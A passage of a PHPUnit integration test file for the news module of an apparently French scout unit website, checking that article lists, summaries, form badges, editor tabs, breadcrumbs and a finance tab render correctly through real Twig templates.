<?php

declare(strict_types=1);

namespace Tests\Modules\News\Controller;

use Tests\Core\Mail\Template\EmailTemplateRendererFactory;

use Core\Badge\MemberBadgeRepository;
use Core\Config\ScoutYearService;
use Core\Config\SettingRepository;
use Core\Config\SettingService;
use Core\Database\Connection;
use Core\File\FileRepository;
use Core\File\UploadHandler;
use Core\Http\Request;
use Tests\RequestWithInput;
use Core\Import\MemberYearRepository;
use Core\Journal\JournalService;
use Core\Mail\MailService;
use Core\Member\MemberService;
use Core\Member\SectionService;
use Core\Pdf\PosterPdfService;
use Core\Scheduler\SchedulerRepository;
use Core\Scheduler\SchedulerService;
use Core\Security\AuthSession;
use Core\Security\CsrfGuard;
use Core\Security\EncryptionService;
use Core\Security\Role;
use Core\Security\RoleResolver;
use Core\Security\UserAccountRepository;
use Core\Url\ShortUrlRepository;
use Core\Url\ShortUrlService;
use Core\View\EditableContentRepository;
use Core\View\EditableContentService;
use Core\View\TwigFactory;
use Modules\Finance\Api\FinanceAccountInterface;
use Modules\News\Controller\FormController;
use Modules\News\Controller\NewsController;
use Modules\News\Repository\Article;
use Modules\News\Repository\ArticleRepository;
use Modules\News\Repository\FormField;
use Modules\News\Repository\FormFieldRepository;
use Modules\News\Repository\FormRepository;
use Modules\News\Repository\FormResponseRepository;
use Modules\News\Repository\NewsForm;
use Modules\News\Service\ArticleService;
use Modules\News\Service\FormService;
use Modules\News\Service\ResponseService;
use Modules\News\Service\SeoKeywordService;
use Modules\News\Task\SendPendingTicketsHandler;
use PHPUnit\Framework\TestCase;
use Tests\DatabaseTestHelper;
use Tests\Modules\News\NewsTestHelper;
use Twig\Environment;
use Core\Member\Repository\MemberProfileRepository;
use Core\Member\Repository\SectionRepository;

/**
 * End-to-end controller tests rendering the REAL templates (not stubs),
 * so a Twig runtime error (undefined filter/method/property) fails here
 * rather than only being caught manually in a browser.
 *
 * @group database
 */
#[\PHPUnit\Framework\Attributes\Group('database')]
// This class builds its doubles once (in setUp() or a shared helper) and
// hands the same ones to every test: some tests set expectations on
// them, the others only need their answers, and PHPUnit would report
// each of those as a mock with no expectation (issue #665).
#[\PHPUnit\Framework\Attributes\AllowMockObjectsWithoutExpectations]
class NewsIntegrationTest extends TestCase
{
    private \PDO $pdo;
    private EncryptionService $encryption;
    private NewsController $newsController;
    private FormController $formController;
    private ArticleRepository $articleRepository;
    private FormRepository $formRepository;
    private FormFieldRepository $fieldRepository;
    private FormResponseRepository $responseRepository;
    private int $chiefAccountId;
    private ArticleService $articleService;
    private FormService $formService;
    private ResponseService $responseService;
    private Environment $twig;
    private ScoutYearService $scoutYearService;
    private SettingService $settingService;
    private SchedulerService $schedulerService;
    private UserAccountRepository $userAccountRepository;
    private MemberService $memberService;
    private SectionService $sectionService;
    private JournalService $journalService;
    private EditableContentService $editableContentService;

    protected function setUp(): void
    {
        $this->pdo = DatabaseTestHelper::createTestDatabase();
        NewsTestHelper::createTables($this->pdo);
        $this->encryption = new EncryptionService(str_repeat('a', 32), str_repeat('b', 32));

        $stmt = $this->pdo->prepare('INSERT INTO user_accounts (email_encrypted, email_blind_index) VALUES (?, ?)');
        $stmt->execute([$this->encryption->encrypt('chief@test.com', 'user_accounts.email'), $this->encryption->blindIndex('chief@test.com', 'email')]);
        $this->chiefAccountId = (int) $this->pdo->lastInsertId();

        $this->articleRepository = new ArticleRepository($this->pdo);
        $this->formRepository = new FormRepository($this->pdo);
        $this->fieldRepository = new FormFieldRepository($this->pdo);
        $this->responseRepository = new FormResponseRepository($this->pdo, $this->encryption);

        $editableContentService = new EditableContentService(new EditableContentRepository($this->pdo));
        $shortUrlService = new ShortUrlService(new ShortUrlRepository($this->pdo, new \Core\Security\EncryptionService(str_repeat('a', 32), str_repeat('b', 32))));
        $articleService = new ArticleService($this->articleRepository, $this->formRepository, $editableContentService, $shortUrlService, new \Core\File\FileRepository($this->pdo));
        $formService = new FormService($this->formRepository, $this->fieldRepository, $articleService, $this->responseRepository);
        $this->articleService = $articleService;
        $this->formService = $formService;
        $this->editableContentService = $editableContentService;

        $connection = Connection::withPdo($this->pdo);
        $roleResolver = new RoleResolver(new MemberYearRepository($this->pdo), $this->encryption, $this->pdo);
        $sectionService = new SectionService(
    new SectionRepository($connection),
    new MemberProfileRepository($connection, $this->encryption, new MemberBadgeRepository($this->pdo))
);
        $this->sectionService = $sectionService;
        $mailService = $this->createStub(MailService::class);

        $templateDir = dirname(__DIR__, 4) . '/core/View/templates';
        $moduleViews = dirname(__DIR__, 4) . '/modules/news/views';
        $twig = TwigFactory::create($templateDir, false, ['news' => $moduleViews]);
        $twig->addGlobal('site_name', 'Test Unit');
        $twig->addGlobal('is_authenticated', false);
        $twig->addGlobal('current_user_role', 'public');
        $twig->addGlobal('config_mode', false);
        $twig->addGlobal('cookie_consent_given', true);
        $twig->addGlobal('menus', null);
        $twig->addGlobal('current_path', '/news');
        $this->twig = $twig;

        $responseService = new ResponseService(
            $this->responseRepository, $roleResolver, $sectionService, $mailService, EmailTemplateRendererFactory::shippedOnlyForModule($twig, 'news'), $shortUrlService,
            'https://example.com', 'Test Unit'
        );
        $this->responseService = $responseService;

        $settingService = new SettingService(new SettingRepository($this->pdo));
        $scoutYearService = new ScoutYearService($this->pdo);
        $schedulerService = new SchedulerService(new SchedulerRepository($this->pdo));
        $userAccountRepository = new UserAccountRepository($this->pdo, $this->encryption);
        $this->settingService = $settingService;
        $this->scoutYearService = $scoutYearService;
        $this->schedulerService = $schedulerService;
        $this->userAccountRepository = $userAccountRepository;

        $memberService = new MemberService(
    new MemberYearRepository($this->pdo),
    new MemberProfileRepository($connection, $this->encryption)
);
        $this->memberService = $memberService;

        $uploadHandler = new UploadHandler(new FileRepository($this->pdo), sys_get_temp_dir());
        $journalService = $this->createMock(JournalService::class);
        $this->journalService = $journalService;

        $this->newsController = new NewsController(
            $twig, $articleService, $formService, $responseService, new SeoKeywordService(null),
            new PosterPdfService(), $scoutYearService, $settingService, $schedulerService, $userAccountRepository,
            $memberService, $sectionService, $uploadHandler, new FileRepository($this->pdo), sys_get_temp_dir(), $journalService,
            new \Modules\News\Service\TicketService($this->responseRepository)
        );
        $this->formController = new FormController($twig, $articleService, $formService, $responseService, $scoutYearService, $journalService);

        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }
        $_SESSION = [];
    }

    protected function tearDown(): void
    {
        AuthSession::logout();
        unset($_FILES['image']);
    }

    public function testPublicListRendersWithNoArticles(): void
    {
        $response = $this->newsController->index(new Request('GET', '/news', [], [], [], []), []);
        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('Aucune actualité', $response->getBody());
    }

    public function testPublicListRendersAnArticleCard(): void
    {
        NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp ete', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));

        $response = $this->newsController->index(new Request('GET', '/news', [], [], [], []), []);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('Camp ete', $response->getBody());
    }

    /**
     * The second page is a second query, and it has to ask the same
     * role-aware question as the first — an `identified` article that
     * fell past page 1 must still reach the member it was written for.
     */
    public function testPublicListSecondPageStaysRoleAware(): void
    {
        AuthSession::login($this->chiefAccountId, 'parent@test.com', 'identified');

        // 30 per page: 31 public articles push one `identified` article
        // onto page 2, oldest last.
        $reserved = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Reserve aux membres', Article::VISIBILITY_IDENTIFIED, false, null, null, $this->chiefAccountId));
        $this->pdo->exec("UPDATE news_articles SET created_at = '2020-01-01 10:00:00', status = 'published', published_at = '2020-01-01 10:00:00' WHERE id = {$reserved}");
        for ($i = 1; $i <= 31; $i++) {
            $id = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Public ' . $i, Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
            $this->pdo->exec("UPDATE news_articles SET created_at = '2026-01-01 10:00:00', status = 'published', published_at = '2026-01-01 10:00:00' WHERE id = {$id}");
        }

        $page2 = $this->newsController->index(new Request('GET', '/news', ['page' => '2'], [], [], []), []);

        $this->assertSame(200, $page2->getStatusCode());
        $this->assertStringContainsString('Reserve aux membres', $page2->getBody());
    }

    public function testPublicListNeverShowsDirectLinkArticles(): void
    {
        NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Secret', Article::VISIBILITY_DIRECT_LINK, false, null, null, $this->chiefAccountId));

        $response = $this->newsController->index(new Request('GET', '/news', [], [], [], []), []);

        $this->assertStringNotContainsString('Secret', $response->getBody());
    }

    public function testManageListRendersForChief(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Article', Article::VISIBILITY_CHIEF, false, null, null, $this->chiefAccountId));

        $response = $this->newsController->manage(new Request('GET', '/news/manage', [], [], [], []), []);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('Article', $response->getBody());
    }

    // --- #1359: the summary is read whole; the scheduling badge fits ---

    private const LONG_SUMMARY = 'Le week-end de rentrée réunit toutes les sections autour d\'un grand jeu de piste dans la forêt, '
        . 'avec veillée, repas partagé et nuit sous tente : prévoyez des vêtements chauds, une lampe de poche, '
        . 'un sac de couchage, vos gourdes remplies, et apportez les autorisations signées avant vendredi soir DERNIER-MOT';

    private function articleWithSummary(string $title, ?string $summary): int
    {
        $id = NewsTestHelper::publish(
            $this->pdo,
            $this->articleRepository->create($title, Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId, $summary)
        );
        $this->pdo->prepare("UPDATE news_articles SET status = 'published', published_at = ? WHERE id = ?")
            ->execute(['2026-01-01 10:00:00', $id]);

        return $id;
    }

    public function testTheSummaryIsShownWholeOnThePublicList(): void
    {
        $this->articleWithSummary('Week-end de rentrée', self::LONG_SUMMARY);

        $body = $this->newsController->index(new Request('GET', '/news', [], [], [], []), [])->getBody();

        $this->assertStringContainsString('DERNIER-MOT', $body, 'the last word of a 300-character summary');
        $this->assertStringNotContainsString('line-clamp', $body);
        $this->assertDoesNotMatchRegularExpression('/<p class="[^"]*text-truncate[^"]*">[^<]*DERNIER-MOT/u', $body);
        $this->assertSame(1, substr_count($body, 'DERNIER-MOT'), 'one summary, never duplicated per screen size');
        $this->assertStringContainsString('news-card__excerpt', $body);
    }

    public function testTheSummaryIsShownWholeOnTheManagersListToo(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $this->articleWithSummary('Week-end de rentrée', self::LONG_SUMMARY);

        $body = $this->newsController->manage(new Request('GET', '/news/manage', [], [], [], []), [])->getBody();

        $this->assertSame(1, substr_count($body, 'DERNIER-MOT'));
        $this->assertStringNotContainsString('line-clamp', $body);
    }

    /** No summary, no paragraph: nothing is invented, and the card still renders and links. */
    public function testAnArticleWithoutASummaryHasNoSummaryParagraph(): void
    {
        $id = $this->articleWithSummary('Sans résumé', null);

        $body = $this->newsController->index(new Request('GET', '/news', [], [], [], []), [])->getBody();

        $this->assertStringContainsString('Sans résumé', $body);
        $this->assertStringContainsString('href="/news/' . $id . '"', $body);
        $this->assertStringNotContainsString('news-card__excerpt', $body);
    }

    public function testAScheduledArticleBadgeDropsTheWeekdayAndMayWrap(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $id = $this->articleWithSummary('Programmée', self::LONG_SUMMARY);
        $at = (new \DateTimeImmutable('first day of next month'))->setTime(8, 0);
        $this->pdo->prepare("UPDATE news_articles SET status = 'published', published_at = ? WHERE id = ?")
            ->execute([$at->format('Y-m-d H:i:s'), $id]);

        $body = $this->newsController->manage(new Request('GET', '/news/manage', [], [], [], []), [])->getBody();

        $this->assertStringContainsString(
            \Modules\News\Service\PublicationWording::scheduledBadgeLabel($at->format('Y-m-d H:i:s')),
            $body
        );
        $this->assertDoesNotMatchRegularExpression(
            '/Programmée le[\s\x{00A0}](lundi|mardi|mercredi|jeudi|vendredi|samedi|dimanche)/u',
            $body
        );
        $this->assertMatchesRegularExpression('/<span class="badge[^"]*text-wrap[^"]*">Programmée le/', $body, 'the badge may wrap');
        $this->assertMatchesRegularExpression(
            '/<span class="badge[^"]*badge-wrap[^"]*">Programmée le/',
            $body,
            'a wrapping badge takes the class that restores its line height'
        );

        // Bootstrap's `.badge` is `line-height: 1`: two wrapped lines would touch.
        $css = (string) file_get_contents(dirname(__DIR__, 4) . '/public/assets/css/app.css');
        $this->assertSame(1, preg_match('/\.badge-wrap\s*\{[^}]*line-height:\s*(\d+(?:\.\d+)?)\s*;/', $css, $rule));
        $this->assertGreaterThan(1.0, (float) $rule[1]);
    }

    /** The detail page and the not-online page still name the day: only the list badge changed. */
    public function testTheLongFormatStaysWhereItWas(): void
    {
        $this->assertStringContainsString(
            'dimanche',
            \Modules\News\Service\PublicationWording::longDateTime('2026-11-22 08:00:00')
        );
    }

    // --- IT-01: one target per row, one component for the sub-navigation ---

    public function testAManagedArticleRowLeadsToItsManagementPage(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Souper', Article::VISIBILITY_CHIEF, false, null, null, $this->chiefAccountId));

        $body = $this->newsController->manage(new Request('GET', '/news/manage', [], [], [], []), [])->getBody();

        // One row, one target. The card used to carry a stretched-link to
        // the public view PLUS an « Éditer » button escaping it with a
        // z-index — and the button was the way in that everybody used.
        $this->assertStringContainsString('href="/news/' . $articleId . '/gerer"', $body);
        $this->assertStringNotContainsString('position-absolute top-0 end-0', $body);
    }

    public function testAPublicArticleRowStillLeadsToThePublicArticle(): void
    {
        NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));

        $body = $this->newsController->index(new Request('GET', '/news', [], [], [], []), [])->getBody();

        $this->assertStringNotContainsString('/gerer', $body);
    }

    // ── The form badge of a list card (#1377) ──────────────────────────

    /**
     * A published public article with a form row, the fields given as
     * [type, label] pairs, and the form forced closed or not.
     *
     * @param list<array{0: string, 1: string}> $fields
     */
    private function publishedArticleWithForm(string $title, array $fields, bool $forceClosed = false): int
    {
        $articleId = NewsTestHelper::publish(
            $this->pdo,
            $this->articleRepository->create($title, Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId)
        );
        $formId = $this->formRepository->create(
            $articleId,
            NewsForm::ACCESS_PUBLIC,
            NewsForm::RESPONSE_LIMIT_UNLIMITED,
            null,
            null,
            $forceClosed,
            'chief',
            null,
            null
        );
        foreach ($fields as $order => [$type, $label]) {
            $this->fieldRepository->create($formId, $order, $type, $label, false, null, null, null, null, null);
        }

        return $articleId;
    }

    /** @return array<string, string> both lists, as the visitor and the manager see them */
    private function listBodies(): array
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        return [
            'public' => $this->newsController->index(new Request('GET', '/news', [], [], [], []), [])->getBody(),
            'manage' => $this->newsController->manage(new Request('GET', '/news/manage', [], [], [], []), [])->getBody(),
        ];
    }

    public function testAFormWithOnlyATextBlockShowsNoBadgeInEitherList(): void
    {
        // The default article: a form row that holds a single block of text.
        $this->publishedArticleWithForm('Fête du test', [[FormField::TYPE_TEXT, 'Bienvenue']]);

        foreach ($this->listBodies() as $list => $body) {
            $this->assertStringContainsString('Fête du test', $body, $list);
            $this->assertStringNotContainsString('Formulaire ouvert', $body, $list);
            $this->assertStringNotContainsString('Formulaire fermé', $body, $list);
        }
    }

    public function testAFormWithOnlyNonInputFieldsShowsNoBadgeEvenWhenClosed(): void
    {
        $this->publishedArticleWithForm(
            'Miam',
            [[FormField::TYPE_TEXT, 'Menu'], [FormField::TYPE_CONFIRMATION, 'J\'ai lu']],
            forceClosed: true
        );

        foreach ($this->listBodies() as $list => $body) {
            $this->assertStringContainsString('Miam', $body, $list);
            $this->assertStringNotContainsString('Formulaire ouvert', $body, $list);
            $this->assertStringNotContainsString('Formulaire fermé', $body, $list);
        }
    }

    public function testAnArticleWithoutAnyFormShowsNoBadge(): void
    {
        NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Sans formulaire', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));

        foreach ($this->listBodies() as $list => $body) {
            $this->assertStringContainsString('Sans formulaire', $body, $list);
            $this->assertStringNotContainsString('Formulaire ouvert', $body, $list);
            $this->assertStringNotContainsString('Formulaire fermé', $body, $list);
        }
    }

    public function testAnOpenFormWithARealFieldShowsTheOpenBadgeInBothLists(): void
    {
        $this->publishedArticleWithForm('Inscription', [[FormField::TYPE_TEXT, 'Intro'], [FormField::TYPE_SHORT_TEXT, 'Votre nom']]);

        foreach ($this->listBodies() as $list => $body) {
            $this->assertStringContainsString('Formulaire ouvert', $body, $list);
            $this->assertStringNotContainsString('Formulaire fermé', $body, $list);
        }
    }

    public function testAClosedFormWithARealFieldShowsTheClosedBadgeInBothLists(): void
    {
        $this->publishedArticleWithForm('Inscription close', [[FormField::TYPE_SHORT_TEXT, 'Votre nom']], forceClosed: true);

        foreach ($this->listBodies() as $list => $body) {
            $this->assertStringContainsString('Formulaire fermé', $body, $list);
            $this->assertStringNotContainsString('Formulaire ouvert', $body, $list);
        }
    }

    public function testTheBadgeFollowsTheFieldsOfEachCardNotThoseOfItsNeighbour(): void
    {
        $this->publishedArticleWithForm('Avec question', [[FormField::TYPE_SHORT_TEXT, 'Votre nom']]);
        $this->publishedArticleWithForm('Texte seul', [[FormField::TYPE_TEXT, 'Bienvenue']]);

        foreach ($this->listBodies() as $list => $body) {
            $this->assertSame(1, substr_count($body, 'Formulaire ouvert'), $list);
        }
    }

    public function testTheFormTabsAreTheSharedNavRailAndNoLongerPills(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId));
        $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);

        $body = $this->newsController->edit(
            new Request('GET', '/news/' . $articleId . '/gerer', [], [], [], []),
            ['id' => (string) $articleId]
        )->getBody();

        $this->assertStringContainsString('nav nav-underline', $body);
        $this->assertStringNotContainsString('nav nav-pills', $body);
        $this->assertStringContainsString('href="/news/' . $articleId . '/gerer"', $body);
        $this->assertStringContainsString('href="/news/' . $articleId . '/gerer?tab=preview"', $body);
    }

    /**
     * Another module's action ("Partager") shows in the editor through the
     * registry, and nowhere when nothing is registered.
     */
    public function testTheEditorShowsTheActionsOtherModulesContribute(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $registry = new \Modules\News\Service\ArticleActionRegistry();
        $registry->register(new class implements \Modules\News\Api\ArticleActionProviderInterface {
            public function actionsFor(int $articleId): array
            {
                return [new \Modules\News\Api\ArticleAction(
                    'Partager',
                    '/medias-sociaux/nouvelle/article/' . $articleId,
                    'bi-share',
                    true
                )];
            }

            public function noteFor(int $articleId): ?\Modules\News\Api\ArticleNote
            {
                return null;
            }
        });
        $controller = new NewsController(
            $this->twig, $this->articleService, $this->formService, $this->responseService, new SeoKeywordService(null),
            new PosterPdfService(), $this->scoutYearService, $this->settingService, $this->schedulerService, $this->userAccountRepository,
            $this->memberService, $this->sectionService, new UploadHandler(new FileRepository($this->pdo), sys_get_temp_dir()),
            new FileRepository($this->pdo), sys_get_temp_dir(), $this->journalService,
            new \Modules\News\Service\TicketService($this->responseRepository), articleActions: $registry
        );
        $request = new Request('GET', '/news/' . $articleId . '/gerer', [], [], [], []);

        $body = $controller->edit($request, ['id' => (string) $articleId])->getBody();
        $this->assertStringContainsString('data-article-actions', $body);
        $this->assertStringContainsString('href="/medias-sociaux/nouvelle/article/' . $articleId . '"', $body);
        $this->assertStringContainsString('aria-label="Partager"', $body);

        $this->assertStringNotContainsString('/medias-sociaux/nouvelle/article/', $this->newsController->edit($request, ['id' => (string) $articleId])->getBody());

        // A draft offers none of them: nothing is shared before publication.
        $this->articleService->unpublish($articleId);
        $draft = $controller->edit($request, ['id' => (string) $articleId])->getBody();
        $this->assertStringNotContainsString('/medias-sociaux/nouvelle/article/', $draft);
    }

    public function testTheEditorTabIsTheSelectedOneAndThePreviewTabIsNot(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId));
        $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);

        // Two views of ONE route, told apart by a query string the picker
        // never sees — so the call site computes a synthetic current_path.
        $preview = $this->newsController->edit(
            new Request('GET', '/news/' . $articleId . '/gerer', ['tab' => 'preview'], [], [], []),
            ['id' => (string) $articleId]
        )->getBody();

        $this->assertMatchesRegularExpression(
            '#href="/news/' . $articleId . '/gerer\?tab=preview"[^>]*class="[^"]*\bactive\b#',
            $preview
        );
    }

    public function testNoTabRailAtAllBeforeTheArticleIsSaved(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $body = $this->newsController->create(new Request('GET', '/news/create', [], [], [], []), [])->getBody();

        // Nowhere to navigate yet, and "/news//gerer" would 404.
        $this->assertStringNotContainsString('news-form-tabs', $body);
    }

    public function testTheFinanceTabIsAbsentWithoutTheFinanceModule(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId));
        $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, 3);

        // $this->newsController is built with no FinanceAccountInterface.
        $body = $this->newsController->edit(
            new Request('GET', '/news/' . $articleId . '/gerer', [], [], [], []),
            ['id' => (string) $articleId]
        )->getBody();

        $this->assertStringNotContainsString('/finance/receivables', $body);
    }

    public function testTheFinanceTabIsTheRailsEndTabWhenTheModuleIsOnAndTheFormIsPaid(): void
    {
        [$controller] = $this->controllerWithFinanceAccounts();
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, 42);

        $body = $controller->edit(
            new Request('GET', '/news/' . $articleId . '/gerer', [], [], [], []),
            ['id' => (string) $articleId]
        )->getBody();

        // `id` is the FORM's id: ResponseService registers its receivables
        // as ('news', $form->id), so that is what receivables.html.twig
        // compares its focus_id against.
        $this->assertStringContainsString('/finance/receivables?source=news&amp;id=' . $formId, $body);
        // It leaves the module, so it sits apart from the four tabs that
        // do not.
        $this->assertStringContainsString('<li class="nav-item ms-auto">', $body);
    }

    public function testTheFinanceTabIsAbsentOnAFormWithNoAccount(): void
    {
        [$controller] = $this->controllerWithFinanceAccounts();
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Réunion', Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId));
        $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);

        $body = $controller->edit(
            new Request('GET', '/news/' . $articleId . '/gerer', [], [], [], []),
            ['id' => (string) $articleId]
        )->getBody();

        // Nothing was ever billed here, so the page would open on an
        // accordion that does not contain this form.
        $this->assertStringNotContainsString('/finance/receivables', $body);
    }

    public function testCreateEditorPageRendersForChief(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $response = $this->newsController->create(new Request('GET', '/news/create', [], [], [], []), []);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('Nouvel article', $response->getBody());
    }

    public function testEditEditorPageRendersWithAnExistingFormAndFields(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Article avec formulaire', Article::VISIBILITY_PUBLIC, true, 'mots,cles', '2027-01-01', $this->chiefAccountId));
        $this->articleRepository->setShortUrlCode($articleId, 'abc123');
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_IDENTIFIED, NewsForm::RESPONSE_LIMIT_ONE_PER_ACCOUNT, '2026-01-01', '2026-12-31', false, 'chief', 'resume@unite.test', null);
        $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
        $this->fieldRepository->create($formId, 1, FormField::TYPE_NUMBER, 'Places', false, null, null, 20, null, null);
        $this->fieldRepository->create($formId, 2, FormField::TYPE_DROPDOWN, 'Jour', false, 'manual', "Lundi\nMardi", null, null, null);
        $this->fieldRepository->create($formId, 3, FormField::TYPE_CONFIRMATION, null, false, null, null, null, null, 'Je confirme.');

        $response = $this->newsController->edit(new Request('GET', '/news/' . $articleId . '/gerer', [], [], [], []), ['id' => (string) $articleId]);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('Article avec formulaire', $response->getBody());
        $this->assertStringContainsString('abc123', $response->getBody());
    }

    /**
     * Mirrors testShowSetsBreadcrumbCurrentToTheArticleTitle — the edit
     * page's breadcrumb also shows the real article title, not the
     * route's static "Modifier l'article" label.
     */
    public function testEditEditorPageSetsBreadcrumbCurrentToTheArticleTitle(): void
    {
        $this->twig->addGlobal('route_breadcrumb', ['label' => "Modifier l'article", 'parents' => ['Espace animateurs']]);
        $this->twig->addGlobal('menus', [['id' => 'espace_chefs', 'label' => 'Espace animateurs']]);
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Fête des familles', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));

        $response = $this->newsController->edit(new Request('GET', '/news/' . $articleId . '/gerer', [], [], [], []), ['id' => (string) $articleId]);

        $this->assertMatchesRegularExpression(
            '/aria-current="page">\s*Fête des familles\s*</',
            $response->getBody()
        );
    }

    /**
     * create() passes no article ($article = null in editorContext()) —
     * breadcrumb_current stays unset, so the breadcrumb bar falls back to
     * the route's own static breadcrumb.label ("Nouvel article", see
     * module.json) rather than erroring or showing an empty string.
     */
    public function testCreateEditorPageBreadcrumbFallsBackToTheStaticLabelSinceThereIsNoArticleYet(): void
    {
        $this->twig->addGlobal('route_breadcrumb', ['label' => 'Nouvel article', 'parents' => ['Espace animateurs']]);
        $this->twig->addGlobal('menus', [['id' => 'espace_chefs', 'label' => 'Espace animateurs']]);
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $response = $this->newsController->create(new Request('GET', '/news/create', [], [], [], []), []);

        $this->assertMatchesRegularExpression(
            '/aria-current="page">\s*Nouvel article\s*</',
            $response->getBody()
        );
    }

    public function testEditEditorPreviewTabRendersWithAnExistingFormAndFields(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Article preview', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_IDENTIFIED, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
        $this->fieldRepository->create($formId, 0, FormField::TYPE_NUMBER, 'Repas', false, null, null, 10, null, null);

        $response = $this->newsController->edit(new Request('GET', '/news/' . $articleId . '/gerer', ['tab' => 'preview'], [], [], []), ['id' => (string) $articleId]);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('Aperçu', $response->getBody());
    }

    public function testCreatePageDefaultsFinanceAccountToTheCurrentUsersSection(): void
    {
        $this->pdo->exec("INSERT INTO age_branches (desk_code, label, sort_order) VALUES ('LOU', 'Louveteaux', 1)");
        $branchId = (int) $this->pdo->lastInsertId();
        $this->pdo->exec("INSERT INTO sections (desk_code, age_branch_id, name) VALUES ('LOU01', {$branchId}, 'Meute A')");
        $sectionId = (int) $this->pdo->lastInsertId();
        $this->pdo->exec("INSERT INTO scout_years (label, start_date, end_date, is_current) VALUES ('2025-2026', '2025-09-01', '2026-08-31', 1)");
        $scoutYearId = (int) $this->pdo->lastInsertId();

        $this->pdo->exec("INSERT INTO members (desk_id) VALUES ('DESK_1')");
        $memberId = (int) $this->pdo->lastInsertId();
        $this->pdo->exec("INSERT INTO functions (desk_code, label, role, confirmed) VALUES ('Animateur', 'Animateur', 'chief', 1)");
        $functionId = (int) $this->pdo->lastInsertId();

        $blindIndex = $this->encryption->blindIndex('chief@test.com', 'email');
        $stmt = $this->pdo->prepare(
            'INSERT INTO member_years (member_id, scout_year_id, first_name_encrypted, last_name_encrypted, email_encrypted, email_blind_index)
             VALUES (?, ?, ?, ?, ?, ?)'
        );
        $stmt->execute([$memberId, $scoutYearId, $this->encryption->encrypt('Chef', 'member_years.first_name'), $this->encryption->encrypt('Test', 'member_years.last_name'), $this->encryption->encrypt('chief@test.com', 'member_years.email'), $blindIndex]);
        $memberYearId = (int) $this->pdo->lastInsertId();

        $stmt = $this->pdo->prepare('INSERT INTO member_functions (member_year_id, function_id, section_id, is_main_function) VALUES (?, ?, ?, 1)');
        $stmt->execute([$memberYearId, $functionId, $sectionId]);

        $financeAccount = $this->createMock(FinanceAccountInterface::class);
